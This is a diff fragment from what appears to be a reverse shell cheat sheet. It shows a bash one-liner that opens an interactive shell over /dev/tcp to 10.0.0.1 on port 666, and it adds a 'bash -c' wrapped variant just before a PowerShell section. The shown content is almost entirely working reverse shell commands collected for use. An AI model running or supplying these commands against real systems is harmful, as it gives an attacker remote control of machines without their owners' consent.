@@ -12,7 +12,11 @@ You can find them all around the internet. I couldn't find them all in one place
 ```
 bash -i >& /dev/tcp/10.0.0.1/666 0>&1
 ```
+or    
 
+```
+bash -c 'bash -i >& /dev/tcp/10.0.0.1/666 0>&1'
+```
 
 **PowerShell** 
 
